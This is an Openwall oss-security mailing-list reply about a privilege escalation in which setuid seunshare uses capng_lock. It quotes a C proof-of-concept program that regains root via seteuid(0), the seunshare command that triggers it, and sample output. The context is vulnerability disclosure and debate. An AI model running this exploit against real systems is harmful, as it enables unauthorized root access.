  oss-security - Re: local privilege escalation due to capng_lock as used in seunshare            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 29 Apr From: Steve Grubb <sgrubb@...hat.com> To: oss-security@...ts.openwall.com Cc: Andy Lutomirski <luto@...capital.net> Subject: Re: local privilege escalation due to capng_lock as used in seunshare  On Tuesday, April 29, PM Andy Lutomirski wrote: > cap-ng's capng_lock function is insecure, seunshare uses it, and > seunshare is installed setuid root. >  > This results in a setuid program like this: >  > #include <sys/types.h> > #include <unistd.h> > #include <stdio.h> > #include <err.h> >  > int main() > { >   if (setuid(getuid()) != 0) >     err(1, "setuid(getuid())");  If you do not want the saved uid to be available, you need to use setresuid.  That removes it. I would classify this as a bug in the test program.  -Steve  >   printf("Dropped privs; real uid is %lu and effective uid is %lu\n", >      (unsigned long)getuid(), (unsigned long)geteuid()); >  >   seteuid(0); >  >   /* Do something that risks executing untrusted code here */ >  >   if (geteuid() == 0) { >     printf("It's baaaack!\n"); >   } else { >     printf("Phew, safe.\n"); >   } >  >   return 0; > } >  > behaving like this: >  > $ ./sesploit > Dropped privs; real uid is and effective uid is > Phew, safe. >  > This is okay until an attacker does: >  > $ seunshare -t . `realpath ./sesploit` > Dropped privs; real uid is and effective uid is > It's baaaack! >  > newrole may have the same issue. >  > This was described recently here: > >  > and has been publicly disclosed in Red Hat's bugzilla for quite some time: > > >  > I believe that there is at least one setuid program that can be used > as a vector and is widely installed. >  > There's a patch here: >  >   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      